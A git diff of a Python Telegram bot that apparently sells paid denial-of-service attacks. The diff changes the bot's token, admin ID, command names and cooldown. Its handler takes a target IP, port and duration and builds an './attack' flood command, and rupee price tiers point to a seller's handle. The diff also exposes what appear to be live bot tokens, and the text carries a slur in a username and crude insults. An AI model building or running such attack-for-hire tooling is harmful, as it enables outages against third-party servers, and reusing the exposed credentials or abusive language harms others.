@@ -10,9 +10,9 @@ from keep_alive import keep_alive
 keep_alive()
 
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('7309337654:AAHSz5ED1QKgN8AzVuFrIWyxQ-vbvAUhN8A')
+bot = telebot.TeleBot('7007271288:AAEWK3PsuVupxBYgxwET8PVvvu4KBRoCn0E')
 # Admin user IDs
-admin_id = {"7292144634"}
+admin_id = {"6997944818"}
 
 # Files for data storage
 USER_FILE = "users.json"
@@ -20,7 +20,7 @@ LOG_FILE = "log.txt"
 KEY_FILE = "keys.json"
 
 # Cooldown settings
-COOLDOWN_TIME = 240  # in seconds
+COOLDOWN_TIME = 180  # in seconds
 CONSECUTIVE_ATTACKS_LIMIT = 9
 CONSECUTIVE_ATTACKS_COOLDOWN = 3 # in seconds
 
@@ -95,7 +95,7 @@ def generate_key(length=20):
 def add_time_to_current_date(hours=0, days=0):
     return (datetime.datetime.now() + datetime.timedelta(hours=hours, days=days)).strftime('%Y-%m-%d %H:%M:%S')
 
-@bot.message_handler(commands=['genkey'])
+@bot.message_handler(commands=['lmo'])
 def generate_key_command(message):
     user_id = str(message.chat.id)
     if user_id in admin_id:
@@ -113,7 +113,7 @@ def generate_key_command(message):
                 key = generate_key()
                 keys[key] = expiration_date
                 save_keys()
-                response = f"𝐊𝐞𝐲 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐢𝐨𝐧: {key}\n𝐄𝐬𝐩𝐢𝐫𝐞𝐬 𝐎𝐧: {expiration_date}"
+                response = f"𝐊𝐞𝐲 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐢𝐨𝐧: {key}\n𝐄𝐱𝐩𝐢𝐫𝐞𝐬 𝐎𝐧: {expiration_date}"
             except ValueError:
                 response = "𝐏𝐥𝐞𝐚𝐬𝐞 𝐒𝐩𝐞𝐜𝐢𝐟𝐲 𝐀 𝐕𝐚𝐥𝐢𝐝 𝐍𝐮𝐦𝐛𝐞𝐫 𝐚𝐧𝐝 𝐮𝐧𝐢𝐭 𝐨𝐟 𝐓𝐢𝐦𝐞 (hours/days)."
         else:
@@ -189,7 +189,7 @@ def handle_bgmi(message):
                 if time > 9999:
                     response = "⚠️ 𝙀𝙧𝙧𝙤𝙧: 𝙐𝙨𝙚 𝙡𝙚𝙨𝙨𝙩𝙝𝙚𝙣 9999 𝙎𝙚𝙘𝙤𝙣𝙙𝙨."
                 else: 
-                    record_command_logs(user_id, '/attack', target, port, time)
+                    record_command_logs(user_id, '/luis', target, port, time)
                     log_command(user_id, target, port, time)
                     start_attack_reply(message, target, port, time)
                     full_command = f"./attack {target} {port} {time} 500"
@@ -289,13 +289,6 @@ def show_help(message):
 💥 /mylogs: 𝐀𝐏𝐊𝐄 𝐏𝐎𝐎𝐑𝐀𝐍𝐄 𝐊𝐀𝐀𝐑𝐍𝐀𝐌𝐄 𝐉𝐀𝐍𝐍𝐄 𝐊 𝐋𝐈𝐘𝐄.
 💥 /plan: 𝐉𝐢𝐧𝐝𝐠𝐢 𝐦𝐞 𝐊𝐨𝐞 𝐏𝐋𝐀𝐍 𝐧𝐚𝐡𝐢 𝐡𝐨𝐧𝐚 𝐂𝐡𝐚𝐡𝐢𝐲𝐞.
 💥 /redeem <key>: 𝐊𝐞𝐲 𝐑𝐞𝐝𝐞𝐞𝐦 𝐰𝐚𝐥𝐚 𝐂𝐨𝐦𝐦𝐚𝐧𝐝.
-
-🤖 Admin commands:
-💥 /genkey <amount> <hours/days>: 𝐓𝐎 𝐌𝐀𝐊𝐄 𝐊𝐄𝐘.
-💥 /allusers: 𝐋𝐢𝐒𝐓 𝐎𝐅 𝐂𝐇𝐔𝐓𝐘𝐀 𝐔𝐒𝐄𝐑𝐒.
-💥 /logs: 𝐀𝐀𝐏𝐊𝐄 𝐊𝐀𝐑𝐓𝐎𝐎𝐓𝐄 𝐉𝐀𝐍𝐍𝐄 𝐖𝐀𝐋𝐀 𝐂𝐎𝐌𝐌𝐀𝐍𝐃.
-💥 /clearlogs: 𝐅𝐔𝐂𝐊 𝐓𝐇𝐄 𝐋𝐎𝐆 𝐅𝐈𝐋𝐄.
-💥 /broadcast <message>: 𝐁𝐑𝐎𝐀𝐃𝐂𝐀𝐒𝐓 𝐊𝐀 𝐌𝐀𝐓𝐋𝐀𝐁 𝐓𝐎 𝐏𝐀𝐓𝐀 𝐇𝐎𝐆𝐀 𝐀𝐍𝐏𝐀𝐃.
 '''
     bot.reply_to(message, help_text)
 
@@ -331,11 +324,11 @@ VIP 🌟:
 𝐃𝐚𝐲: 100 𝐫𝐬
 𝐖𝐞𝐞𝐤: 500 𝐫𝐬
 𝐌𝐨𝐧𝐓𝐡: 1200 𝐫𝐬 
-@niggabetrayed
+@NB_Luis
 '''
     bot.reply_to(message, response)
 
-@bot.message_handler(commands=['admincomd'])
+@bot.message_handler(commands=['adm'])
 def admin_commands(message):
     user_name = message.from_user.first_name
     response = f'''{user_name}, 𝐋𝐞 𝐫𝐞 𝐥𝐮𝐧𝐝 𝐊𝐞 𝐘𝐞 𝐑𝐡𝐞 𝐓𝐞𝐫𝐞 𝐜𝐨𝐦𝐦𝐚𝐧𝐝:
